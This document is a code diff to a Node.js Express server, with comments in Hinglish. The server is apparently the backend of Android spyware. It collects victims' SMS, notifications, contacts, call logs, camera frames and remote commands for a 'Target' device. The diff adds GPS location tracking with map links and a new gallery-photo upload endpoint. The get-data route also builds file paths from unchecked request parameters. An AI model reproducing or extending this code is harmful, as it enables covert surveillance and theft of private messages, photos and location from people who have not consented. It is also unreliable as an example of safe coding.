@@ -13,10 +13,10 @@ if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 // --- 2. Middleware ---
 app.use(cors());
-// Image upload ke liye limit badhana zaroori hai
+// Image upload ke liye limit badhai hai (50mb)
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
-app.use(express.static(__dirname));
+app.use(express.static(__dirname)); // Static files (HTML) serve karne ke liye
 
 // --- 3. Live RAM Memory (Device Status) ---
 let devicesStatus = {}; 
@@ -25,9 +25,10 @@ let devicesStatus = {};
 // 📲 PHONE SIDE API (Android yahan data bhejega)
 // ==================================================
 
-// 1. HEARTBEAT / STATUS UPDATE
+// 1. HEARTBEAT / STATUS UPDATE (🔥 UPDATED: Location Added)
 app.post('/api/status', (req, res) => {
-    let { device_id, model, battery, version, charging } = req.body;
+    // Lat/Lon receive kiya
+    let { device_id, model, battery, version, charging, lat, lon } = req.body;
     
     // Safety Check
     if (!device_id) return res.status(400).json({ error: "No ID provided" });
@@ -37,6 +38,12 @@ app.post('/api/status', (req, res) => {
     // Check agar koi COMMAND pending hai is phone ke liye
     const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";
 
+    // Location Map Link Generator
+    let mapLink = "#";
+    if (lat && lon && lat !== 0.0) {
+        mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+    }
+
     // Update RAM
     devicesStatus[id] = {
         id: id,
@@ -44,15 +51,18 @@ app.post('/api/status', (req, res) => {
         battery: battery || 0,
         version: version || "--",
         charging: (charging === 'true' || charging === true),
+        lat: lat || 0,   // 🔥 Location Saved
+        lon: lon || 0,   // 🔥 Location Saved
+        mapLink: mapLink, // 🔥 Map Link Saved
         lastSeen: Date.now(),
         command: "none" // Command delivered, now reset
     };
 
-    console.log(`📡 [PING] ${id} | Bat: ${battery}% | Cmd: ${pendingCommand}`);
+    console.log(`📡 [PING] ${id} | Bat: ${battery}% | Loc: ${lat},${lon}`);
     res.json({ status: "success", command: pendingCommand });
 });
 
-// 2. DATA UPLOAD (SMS, Notifications, Contacts, Logs)
+// 2. DATA UPLOAD (SMS, Notifications, Contacts, Logs) - (Pehle jaisa hi hai)
 app.post('/api/upload_data', (req, res) => {
     let { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
@@ -61,16 +71,12 @@ app.post('/api/upload_data', (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
 
     try {
-        // Data parsing (String ho to object banao)
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
         
-        // List wale data types (jo judte jayenge)
         const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
         
         if (historyTypes.includes(type)) {
             let existingData = [];
-            
-            // Purani file padho agar hai to
             if (fs.existsSync(filePath)) {
                 try { 
                     existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); 
@@ -80,15 +86,14 @@ app.post('/api/upload_data', (req, res) => {
             }
             if (!Array.isArray(existingData)) existingData = [];
 
-            // 🔥 MERGE LOGIC: [New Data, ...Old Data]
-            // Isse naya message sabse upar rahega file mein
+            // 🔥 MERGE LOGIC (Preserved): [New Data, ...Old Data]
             const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
             const finalData = [...newDataArray, ...existingData];
             
             // File size control (Last 1000 items only)
             fs.writeFileSync(filePath, JSON.stringify(finalData.slice(0, 1000), null, 2));
         } else {
-            // Screen recording ya single files replace hongi
+            // Other files replace logic
             fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
         }
 
@@ -100,7 +105,7 @@ app.post('/api/upload_data', (req, res) => {
     }
 });
 
-// 3. CAMERA FRAME UPLOAD (Ye Missing Tha!)
+// 3. CAMERA FRAME UPLOAD (Pehle jaisa)
 app.post('/api/upload_frame', (req, res) => {
     let { device_id, image_data } = req.body;
     if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
@@ -109,7 +114,6 @@ app.post('/api/upload_frame', (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${id}_cam.json`);
 
     try {
-        // Image ko JSON wrapper me save karte hain taaki frontend asaani se fetch kar sake
         const payload = {
             time: Date.now(),
             image: image_data // Base64 String
@@ -120,6 +124,52 @@ app.post('/api/upload_frame', (req, res) => {
         res.json({ status: "success" });
     } catch (error) {
         console.error(`❌ Cam Error: ${error.message}`);
+        res.status(500).json({ error: "Failed" });
+    }
+});
+
+// 4. 🔥 GALLERY UPLOAD (NEW: Ye add kiya hai)
+app.post('/api/upload_gallery', (req, res) => {
+    let { device_id, image_data, date } = req.body;
+    if (!device_id || !image_data || !date) return res.status(400).json({ error: "Missing Data" });
+
+    const id = device_id.toString().trim().toUpperCase();
+    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);
+
+    try {
+        let galleryData = [];
+        // Load old gallery data
+        if (fs.existsSync(filePath)) {
+            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
+        }
+        if (!Array.isArray(galleryData)) galleryData = [];
+
+        // 🔥 DUPLICATE CHECK: Agar same timestamp wali photo hai, to skip karo
+        const isDuplicate = galleryData.some(photo => photo.time === date);
+
+        if (isDuplicate) {
+            console.log(`⚠️ [GALLERY] Duplicate skipped for ${id}`);
+            return res.json({ status: "skipped" });
+        }
+
+        // Add New Photo to TOP
+        galleryData.unshift({
+            time: date,
+            uploadedAt: Date.now(),
+            image: image_data // Base64
+        });
+
+        // Limit size (Max 200 photos taaki file corrupt na ho)
+        if (galleryData.length > 200) {
+            galleryData = galleryData.slice(0, 200);
+        }
+
+        fs.writeFileSync(filePath, JSON.stringify(galleryData, null, 2));
+        console.log(`🖼️ [GALLERY] Photo Saved for ${id}`);
+        res.json({ status: "success" });
+
+    } catch (error) {
+        console.error(`❌ Gallery Error: ${error.message}`);
         res.status(500).json({ error: "Failed" });
     }
 });
@@ -142,19 +192,17 @@ app.get('/api/device-status/:id', (req, res) => {
         return res.json({ id: id, isOnline: false, model: "Waiting..." });
     }
 
-    // Agar last seen 60 seconds ke andar hai to Online maano
     const isOnline = (Date.now() - device.lastSeen) < 60000;
     res.json({ ...device, isOnline });
 });
 
-// Send Command (Vibrate, TTS, Toast, etc.)
+// Send Command
 app.post('/api/send-command', (req, res) => {
     let { device_id, command } = req.body;
     if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Cmd" });
 
     const id = device_id.toUpperCase().trim();
     
-    // Agar device list me nahi hai, to temp add karo
     if (!devicesStatus[id]) {
         devicesStatus[id] = { id: id, model: "Target", lastSeen: 0 };
     }
@@ -164,16 +212,15 @@ app.post('/api/send-command', (req, res) => {
     res.json({ status: "success", target: id });
 });
 
-// Get JSON Data Files (View Notifications/SMS on Website)
+// Get JSON Data Files (Modified to support gallery)
 app.get('/api/get-data/:device_id/:type', (req, res) => {
     const id = req.params.device_id.toUpperCase().trim();
-    const type = req.params.type; // notifications, sms, cam, etc.
+    const type = req.params.type; // notifications, sms, gallery, etc.
     const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
 
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
     } else {
-        // Agar file nahi hai to empty list bhejo
         res.json([]);
     }
 });
